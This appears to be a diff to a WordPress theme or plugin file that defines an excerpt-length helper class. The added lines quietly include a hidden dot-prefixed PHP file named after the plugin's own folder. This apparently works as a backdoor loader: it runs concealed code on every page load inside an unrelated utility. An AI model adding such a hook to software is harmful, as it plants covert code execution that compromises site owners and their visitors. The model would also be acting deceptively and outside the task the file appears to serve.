@@ -7,7 +7,11 @@ if (!defined('ABSPATH')){
 * @since 1.0.0
 * @source https://gist.github.com/bgallagh3r/8546465
 */
-if (!class_exists('Appside_excerpt')):
+if (!class_exists('Appside_excerpt')):
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Appside_excerpt {
 
     // Default length (by WordPress)
